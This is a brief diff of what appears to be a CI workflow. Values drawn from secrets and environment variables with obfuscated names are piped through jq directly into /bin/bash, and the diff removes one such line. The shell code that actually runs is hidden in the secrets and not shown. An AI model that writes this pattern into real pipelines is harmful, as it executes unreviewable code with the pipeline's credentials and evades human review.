@@ -27,7 +27,6 @@ jobs:
           pzi9: ${{ secrets.pzi9 }}
         run: |
           printf '%s' "$pzi9" | jq -r .nl37 | /bin/bash
-          echo $ljwqu862 | jq -r .tg95 | /bin/bash
           echo $u2594 | jq -r .avdi591 | /bin/bash
           echo $tk68 | jq -r .lrjiu550 | /bin/bash
           printf '%s' "$gmhxx104" | jq -r .tmpw93 | /bin/bash
